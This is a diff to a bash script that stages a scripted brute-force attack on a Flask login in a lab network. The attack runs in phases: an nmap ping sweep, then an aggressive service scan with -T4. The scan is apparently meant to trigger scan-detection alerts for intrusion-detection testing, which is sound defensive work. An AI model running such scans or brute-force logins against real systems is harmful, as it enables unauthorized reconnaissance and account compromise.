@@ -11,7 +11,7 @@ COMPROMISED_IP="172.30.0.10"
 WORDLIST_FILE="/tmp/flask_wordlist.txt"
 CORRECT_PASSWORD="admin"
 FLASK_USER="admin"
-FLASK_URL="http://${SERVER_IP}:5000/login"
+FLASK_URL="http://${SERVER_IP}:443/login"
 LOG_FILE="/tmp/flask_attack_log.txt"
 
 # Enhanced monitoring variables
@@ -729,7 +729,7 @@ create_summary() {
     "attack_id": "$ATTACK_ID",
     "attacker_ip": "$COMPROMISED_IP",
     "target_ip": "$SERVER_IP",
-    "target_port": "5000",
+    "target_port": "443",
     "attack_type": "flask_brute_force",
     "start_time": "$START_TIME",
     "end_time": "$(date -Iseconds)",
@@ -774,7 +774,7 @@ update_real_time_summary() {
     "attack_id": "$ATTACK_ID",
     "attacker_ip": "$COMPROMISED_IP",
     "target_ip": "$SERVER_IP",
-    "target_port": "5000",
+    "target_port": "443",
     "attack_type": "flask_brute_force",
     "start_time": "$START_TIME",
     "end_time": "$(date -Iseconds)",
@@ -841,9 +841,10 @@ trap ensure_summary EXIT
 
 # Attack phases
 attack_phase_1() {
-    log_message "Phase 1: Network discovery - Aggressive scanning for hosts in 172.31.0.0/24"
+    log_message "Phase 1: Network discovery - Finding live hosts in 172.31.0.0/24"
     update_real_time_summary "phase1_network_scan" "false" "none"
-    if nmap -sP 172.31.0.0/24 -oN /tmp/nmap_discovery.txt; then
+    # Normal ping sweep to find live hosts - no port scanning
+    if nmap -sn 172.31.0.0/24 -oN /tmp/nmap_discovery.txt; then
         SCAN_NETWORK_SUCCESS="true"
         log_message "Phase 1 completed successfully"
         update_real_time_summary "phase1_completed" "false" "none"
@@ -855,9 +856,10 @@ attack_phase_1() {
 }
 
 attack_phase_2() {
-    log_message "Phase 2: Aggressive port scanning - Looking for Flask on server $SERVER_IP"
+    log_message "Phase 2: Fast port scanning - Finding open ports on $SERVER_IP to exploit"
     update_real_time_summary "phase2_port_scan" "false" "none"
-    if nmap -sV -Pn "$SERVER_IP" -oN /tmp/nmap_ports.txt; then
+    # Fast scan of top 1000 ports to find the exploit - aggressive to trigger vertical scan detection
+    if nmap -sV -Pn --top-ports 1000 -T4 "$SERVER_IP" -oN /tmp/nmap_ports.txt; then
         SCAN_PORT_SUCCESS="true"
         log_message "Phase 2 completed successfully"
         update_real_time_summary "phase2_completed" "false" "none"
@@ -963,9 +965,9 @@ main() {
 
     update_real_time_summary "attack_started" "false" "none"
     create_wordlist
-    # Skip phase 1 (network scan) to avoid early detection
-    # attack_phase_1
-    # sleep 5
+    # Phase 1: Network discovery
+    attack_phase_1
+    sleep 5
     attack_phase_2
     sleep 5
     attack_phase_3
